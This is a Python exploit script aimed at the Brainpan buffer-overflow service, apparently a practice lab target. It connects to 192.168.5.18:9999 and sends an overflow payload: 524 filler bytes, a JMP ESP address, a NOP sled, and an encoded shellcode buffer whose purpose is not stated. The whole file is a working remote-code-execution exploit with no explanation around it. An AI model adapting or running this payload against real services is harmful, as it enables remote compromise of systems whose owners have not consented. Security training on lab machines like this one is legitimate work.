import socket
import sys
import time

aChars = 'A' * 524
jmpesp = '\xf3\x12\x17\x31'
nops = '\x90' * 16
buf =  ""
buf += "\xb8\x28\x72\xde\x75\xda\xcb\xd9\x74\x24\xf4\x5f\x29"
buf += "\xc9\xb1\x1f\x31\x47\x15\x83\xef\xfc\x03\x47\x11\xe2"
buf += "\xdd\x18\xd4\x2b\x2c\x06\x1f\x30\x1d\xfb\xb3\xdd\xa3"
buf += "\x4b\x55\xab\x42\x66\x1a\x3c\xdf\x11\xdb\xeb\xda\xe5"
buf += "\xb3\xe9\xe4\xf4\x1f\x67\x05\x9c\xf9\x2f\x95\x30\x51"
buf += "\x59\xf4\xf0\x90\xd9\x73\x36\x53\xc3\x35\xc3\x99\x9b"
buf += "\x6b\x2b\xe2\x5b\x33\x46\xe2\x31\xc6\x1f\x01\xf4\x01"
buf += "\xd2\x46\x72\x51\x94\xfb\x96\x76\xd5\x03\xd0\x78\x09"
buf += "\x0c\x22\xf1\xca\xcd\xc9\x0d\xcc\x2d\x01\xbd\xb3\x7c"
buf += "\x9a\x38\x8b\x07\x8b\x19\x85\x19\x32\x2f\xb1\x69\x46"
buf += "\x82\x3a\x0c\x89\x64\x39\xf0\xeb\x2c\x3c\x0e\xec\x4c"
buf += "\x84\x0f\xec\x4c\xfa\xc2\x6c"
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.5.18',9999))
    print(s.recv(1024))
    print('Exploiting Brainpan Buffer Overflow ...')
    s.send(aChars + jmpesp + nops + buf)
    print(s.recv(1024))
    s.close()
except Exception:
    sys.exit()
